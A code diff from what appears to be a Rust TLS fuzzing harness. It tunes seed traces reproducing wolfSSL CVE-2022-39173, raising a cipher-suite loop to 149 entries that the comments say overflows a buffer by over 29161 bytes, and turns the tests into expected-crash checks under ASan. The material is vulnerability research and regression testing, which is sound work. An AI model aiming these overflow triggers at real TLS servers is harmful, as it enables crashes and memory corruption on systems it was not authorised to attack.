@@ -730,7 +730,7 @@ pub fn seed_cve_2022_39173(initial_server: AgentName, server: AgentName) -> Trac
     };
 
     let mut cipher_suites = term! { fn_new_cipher_suites() };
-    for _ in 0..12 {
+    for _ in 0..149 {
         // also works with 149, 150 leads a too large list of suites (as expected)
         // Maximum reached suitesSz value depending on the number of ciphers in the list:
         // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
@@ -874,7 +874,7 @@ pub fn seed_cve_2022_39173_full(
 
     let mut cipher_suites = term! { fn_new_cipher_suites() };
 
-    for _ in 0..100 {
+    for _ in 0..149 {
         // 200 is too large already
         cipher_suites = term! {
             fn_append_cipher_suite(
@@ -1354,18 +1354,18 @@ pub mod tests {
         let initial_server = trace.descriptors[0].name;
         let server = trace.prior_traces[0].descriptors[0].name;
 
-        trace.execute_with_puts(
-            &TLS_PUT_REGISTRY,
-            &[(initial_server, put.clone()), (server, put)],
-        );
-        expect_crash(|| {});
+        expect_crash(move || {
+            trace.execute_with_puts(
+                &TLS_PUT_REGISTRY,
+                &[(initial_server, put.clone()), (server, put.clone())],
+            );
+        });
     }
 
     #[test]
     #[cfg(feature = "tls12")]
     #[cfg(feature = "tls12-session-resumption")]
-    #[ignore] // Disabled because requires wolfSSL 5.3.0
-              // Internally known as "Finding 8"
+    #[cfg(feature = "wolfssl530")]
     fn test_seed_cve_2022_38153() {
         for i in 0..50 {
             seed_successful12_with_tickets.execute_trace();
@@ -1377,24 +1377,39 @@ pub mod tests {
     }
 
     #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[cfg(all(feature = "wolfssl540", feature = "asan"))]
+    #[test]
+    fn test_seed_cve_2022_39173() {
+        expect_crash(|| {
+            seed_cve_2022_39173.execute_trace();
+        })
+    }
+
+    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[cfg(all(feature = "wolfssl540", feature = "asan"))]
     #[test]
     fn test_seed_cve_2022_39173_full() {
-        let ctx = seed_cve_2022_39173_full.execute_trace();
-        assert!(ctx.agents_successful());
+        expect_crash(|| {
+            seed_cve_2022_39173_full.execute_trace();
+        });
     }
 
     #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[cfg(all(feature = "wolfssl540", feature = "asan"))]
     #[test]
     fn test_seed_cve_2022_39173_complete() {
-        let ctx = seed_cve_2022_39173_complete.execute_trace();
-        assert!(ctx.agents_successful());
+        expect_crash(|| {
+            seed_cve_2022_39173_complete.execute_trace();
+        });
     }
 
     #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
+    #[cfg(all(feature = "wolfssl540", feature = "asan"))]
     #[test]
     fn test_seed_cve_2022_39173_minimized() {
-        let ctx = seed_cve_2022_39173_minimized.execute_trace();
-        assert!(ctx.agents_successful());
+        expect_crash(|| {
+            seed_cve_2022_39173_minimized.execute_trace();
+        });
     }
 
     mod tcp {
@@ -1406,11 +1421,7 @@ pub mod tests {
 
         use crate::{
             put_registry::{TCP_PUT, TLS_PUT_REGISTRY},
-            tcp::{
-                openssl_server,
-                tcp_puts::{wolfssl_client, wolfssl_server},
-                wolfssl_client, wolfssl_server,
-            },
+            tcp::tcp_puts::{openssl_server, wolfssl_client, wolfssl_server},
             tls::{
                 trace_helper::TraceHelper,
                 vulnerabilities::{seed_cve_2022_38153, seed_cve_2022_39173_full},
@@ -1419,9 +1430,8 @@ pub mod tests {
 
         #[test]
         #[ignore] // wolfssl example server and client are not available in CI
-                  // Internally known as "Finding 8"
         fn test_wolfssl_openssl_test_seed_cve_2022_38153() {
-            let port = 44334;
+            let port = 44336;
 
             let server_guard = openssl_server(port, TLSVersion::V1_2);
             let server = PutDescriptor {
@@ -1429,7 +1439,7 @@ pub mod tests {
                 options: server_guard.build_options(),
             };
 
-            let port = 44335;
+            let port = 44337;
 
             let client_guard = wolfssl_client(port, TLSVersion::V1_2, Some(50));
             let client = PutDescriptor {
@@ -1453,8 +1463,10 @@ pub mod tests {
         }
 
         #[test]
+        #[cfg(feature = "wolfssl540")]
+        #[ignore] // wolfssl example server and client are not available in CI
         fn test_wolfssl_cve_2022_39173() {
-            let port = 44330;
+            let port = 44338;
             let guard = wolfssl_server(port, TLSVersion::V1_3);
             let put = PutDescriptor {
                 name: TCP_PUT,
